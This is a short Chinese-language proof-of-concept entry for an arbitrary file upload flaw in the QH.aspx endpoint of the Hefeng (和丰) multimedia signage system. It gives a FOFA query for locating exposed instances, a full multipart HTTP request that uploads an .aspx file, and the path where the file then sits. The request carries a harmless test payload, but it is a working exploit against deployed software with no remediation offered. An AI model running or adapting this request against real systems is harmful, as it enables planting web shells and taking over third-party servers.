## 和丰多媒体信息发布系统QH.aspx存在文件上传漏洞

## fofa
```
app="和丰山海-数字标牌"
```

## poc
```
POST /QH.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr

------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="fileToUpload"; filename="qwe.aspx"
Content-Type: application/octet-stream

<% response.write("hello") %>
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="responderId"

ResourceNewResponder
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="remotePath"

/opt/resources
------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
```
文件上传路径`http://ip/opt/resources/qwe.aspx`
